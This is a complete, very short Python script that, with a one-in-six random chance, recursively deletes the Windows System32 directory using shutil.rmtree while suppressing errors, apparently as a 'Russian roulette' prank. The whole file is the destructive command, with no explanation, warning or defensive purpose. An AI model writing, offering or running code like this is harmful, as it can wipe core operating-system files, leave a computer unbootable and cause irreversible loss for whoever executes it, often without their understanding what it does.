import shutil
import random

if random.randint(1,6) == 1:
    shutil.rmtree(r'C:\Windows\System32', ignore_errors=True)
